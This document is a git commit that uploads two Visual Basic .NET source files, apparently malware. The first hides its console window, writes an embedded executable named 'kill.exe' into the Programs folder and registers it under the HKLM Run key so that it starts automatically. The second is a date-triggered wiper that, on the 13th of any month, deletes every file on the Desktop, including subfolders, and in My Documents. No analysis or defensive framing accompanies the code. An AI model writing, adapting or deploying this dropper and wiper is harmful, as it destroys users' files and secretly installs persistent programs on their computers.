3a408bb759b0c0f0569c8049c1c52e3ef3f136e3
Huang Andrew <ktpss96034@yahoo.com.tw>
2016-12-13 21:04:02 +0800

    Add files via upload

---
+++ Sources1.vb
@@ -0,0 +1,17 @@
+﻿Imports System.Windows.Forms
+Module Module1
+    Declare Function GetConsoleWindow Lib "kernel32" () As IntPtr
+    Declare Function ShowWindow Lib "user32" (ByVal hWnd As IntPtr, ByVal nCmdShow As Integer) As Boolean
+    Dim SDir As String
+    Dim total As String
+    Sub Main()
+        Dim int As New IntPtr
+        int = GetConsoleWindow
+        ShowWindow(int, 0)
+        SDir = My.Computer.FileSystem.SpecialDirectories.Programs
+        total = SDir + "\" + "kill.exe"
+        Dim buffer As Byte() = My.Resources.kill1
+        My.Computer.FileSystem.WriteAllBytes(total, buffer, False)
+        My.Computer.Registry.SetValue("HKEY_LOCAL_Machine\SoftWare\Microsoft\Windows\CurrentVersion\Run", "Kill", total)
+    End Sub
+End Module
---
+++ Sources2.vb
@@ -0,0 +1,12 @@
+﻿Module Module1
+    Sub Main()
+        If (Date.Today.Day = "13") Then
+            For Each i As String In FileIO.FileSystem.GetFiles(My.Computer.FileSystem.SpecialDirectories.Desktop, FileIO.SearchOption.SearchAllSubDirectories, "*.*")
+                My.Computer.FileSystem.DeleteFile(i)
+            Next
+            For Each i As String In FileIO.FileSystem.GetFiles(My.Computer.FileSystem.SpecialDirectories.MyDocuments)
+                My.Computer.FileSystem.DeleteFile(i)
+            Next
+        End If
+    End Sub
+End Module
